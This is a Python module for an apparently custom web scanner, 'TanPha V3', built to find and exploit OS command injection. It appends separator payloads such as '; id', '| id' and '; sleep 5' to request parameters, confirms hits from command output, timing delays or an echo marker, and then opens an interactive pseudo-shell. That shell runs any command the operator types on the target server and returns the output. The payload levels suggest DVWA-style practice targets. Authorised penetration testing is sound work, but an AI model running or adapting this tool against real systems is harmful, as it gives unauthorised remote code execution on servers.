"""Command Injection Module for TanPha V3 (Global, Low & Medium)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re

class CommandInjectionModule(BaseModule):
    name = "CommandInjection"
    module_id = "cmd_injection"
    version = "4.2 (Global Final)"
    vulnerability_class = "COMMAND_INJECTION"
    default_impact = "REMOTE_CODE_EXECUTION"
    default_privilege = "SYSTEM"

    def can_run(self, context: TargetContext) -> bool:
        return True

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _get_submit_field(self, context):
        for p in context.discovery.parameters:
            if any(k in p.lower() for k in ["submit", "login", "go", "send", "btn", "save", "upload", "search"]):
                return p
        return "Submit"

    def _get_base_value(self, param):
        if "ip" in param.lower() or "host" in param.lower(): return "127.0.0.1"
        if "url" in param.lower(): return "http://127.0.0.1"
        if "email" in param.lower(): return "test@test.com"
        if any(k in param.lower() for k in ["file", "name", "search", "q"]): return "test"
        return "1"

    def _send_payload(self, context, param, payload, scope_checker=None, timeout=10):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        else:
            submit_field = self._get_submit_field(context)
            base_val = self._get_base_value(param)
            val = base_val + payload if payload else base_val
            data = {param: val, submit_field: submit_field}
            return context.http_client.request("POST", context.target.base_url, data=data, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)

    def _test_direct(self, context: TargetContext, param: str, scope_checker=None) -> list[Evidence]:
        print(f"      [>] Testing Direct CMD on '{param}'...")
        # PAYLOAD LENGKAP: Low (; | &&) & Medium (& \n)
        payloads = [
            {"payload": "; id", "desc": "Semicolon (Low)"},
            {"payload": "| id", "desc": "Pipe (Low & Medium)"},
            {"payload": "&& id", "desc": "AND (Low)"},
            {"payload": "& id", "desc": "Ampersand (Medium Bypass)"},
            {"payload": "\n id", "desc": "Newline (Medium Bypass)"}
        ]
        for item in payloads:
            result = self._send_payload(context, param, item["payload"], scope_checker)
            if result.success and result.response:
                indicators = ["uid=", "gid=", "root", "www-data", "nt authority", "system32"]
                if any(ind in result.response.text.lower() for ind in indicators):
                    print(f"      [!] Potential Direct CMD found using: {item['desc']}")
                    return [Evidence(
                        attempt_id="cmd_dir", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="CHANGED_RESPONSE",
                        reason_code="DIRECT_OUTPUT", reason_detail=f"Output matched using {item['desc']}",
                        confidence=0.8, evidence_text="Direct command output found", assess_payload=item["payload"]
                    )]
        return []

    def _test_time_based(self, context: TargetContext, param: str, scope_checker=None) -> list[Evidence]:
        print(f"      [>] Testing Time-Based CMD on '{param}'...")
        baseline_res = self._send_payload(context, param, "", scope_checker)
        baseline_avg = baseline_res.elapsed if baseline_res.success else 1.0
        threshold = baseline_avg + 4.0
        
        payloads = [
            {"payload": "; sleep 5", "desc": "Linux Sleep (Low)"},
            {"payload": "| sleep 5", "desc": "Linux Pipe Sleep (Medium)"},
            {"payload": "& sleep 5", "desc": "Linux Ampersand Sleep (Medium)"},
            {"payload": "\n sleep 5", "desc": "Linux Newline Sleep (Medium)"},
            {"payload": "& timeout /t 5 >nul", "desc": "Windows Timeout"}
        ]
        for item in payloads:
            res1 = self._send_payload(context, param, item["payload"], scope_checker, timeout=15)
            if res1.success and res1.elapsed >= threshold:
                print(f"      [!] Delay detected ({res1.elapsed:.2f}s) using {item['desc']}. Verifying...")
                res2 = self._send_payload(context, param, item["payload"], scope_checker, timeout=15)
                if res2.success and res2.elapsed >= threshold:
                    print(f"      [+] VERIFIED! {item['desc']} delay.")
                    return [Evidence(
                        attempt_id="cmd_time", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="DELAYED_RESPONSE",
                        reason_code="TIME_DELAY", reason_detail=f"Delayed {res2.elapsed:.2f}s",
                        confidence=0.9, evidence_text="Time-based CMD injection", assess_payload=item["payload"]
                    )]
        return []

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        params_to_test = context.discovery.parameters if context.discovery.parameters else ["ip"]
        for param in params_to_test:
            evs = self._test_direct(context, param, scope_checker)
            if evs: return evs
            evs = self._test_time_based(context, param, scope_checker)
            if evs: return evs
        return []

    def _extract_separator(self, payload: str) -> str:
        if "\n" in payload: return "\n"
        if "&&" in payload: return "&&"
        if "&" in payload: return "&"
        if "|" in payload: return "|"
        if ";" in payload: return ";"
        return ";"

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying CMD on '{evidence.parameter}'...")
        if evidence.reason_code == "TIME_DELAY":
            res = self._send_payload(context, evidence.parameter, evidence.assess_payload, scope_checker, timeout=15)
            if res.success and res.elapsed >= 4.5:
                return VerificationResult(VerificationStatus.VALIDATED, 0.95, "TIME_DELAY_CONFIRMED", f"Delay {res.elapsed:.2f}s", verify_payload=evidence.assess_payload)
            return VerificationResult(VerificationStatus.REJECTED, 0.0, "TIME_DELAY_FAILED", "No delay")
            
        separator = self._extract_separator(evidence.assess_payload)
        marker = "TANPHA_CMD_1337"
        payload = f"{separator} echo {marker}"
        res = self._send_payload(context, evidence.parameter, payload, scope_checker)
        if res.success and res.response and marker in res.response.text:
            return VerificationResult(VerificationStatus.VALIDATED, 0.95, "MARKER_CONFIRMED", f"Echo via '{separator}'", verify_payload=payload)
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "MARKER_FAILED", "Marker not found")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] ACTIVATING INTERACTIVE PSEUDO-SHELL [***]")
        print(f"[*] Target: {finding.location} | Parameter: {finding.parameter}")
        
        separator = self._extract_separator(finding.verify_payload)
        
        # Logika Pintar buat Chain Command biar outputnya bersih
        if separator == "|":
            shell_sep = "&" # Pipe nggak bisa buat chain echo
        elif separator == "&&":
            shell_sep = "&"
        elif separator == "\n":
            shell_sep = "&"
        else:
            shell_sep = separator
            
        print(f"[*] Using separator: '{shell_sep}' for shell commands\n")
        
        while True:
            try:
                cmd = input("TanPha-Shell> ").strip()
                if cmd.lower() in ("exit", "quit"): break
                if not cmd: continue
                
                marker_start = "TANPHA_OUT_START"
                marker_end = "TANPHA_OUT_END"
                payload = f"{shell_sep} echo {marker_start} {shell_sep} {cmd} {shell_sep} echo {marker_end}"
                
                result = self._send_payload(context, finding.parameter, payload, None)
                
                if result.success and result.response:
                    clean_text = re.sub(r'<[^>]+>', '', result.response.text).strip()
                    if marker_start in clean_text and marker_end in clean_text:
                        output = clean_text.split(marker_start)[1].split(marker_end)[0].strip()
                        print(f"\n{output}\n" if output else "\n[*] Executed (no output).\n")
                    else:
                        print("\n[!] Marker not found.\n")
                else:
                    print("[-] Failed to execute command.")
            except KeyboardInterrupt:
                print("\n[*] Exiting shell.")
                break
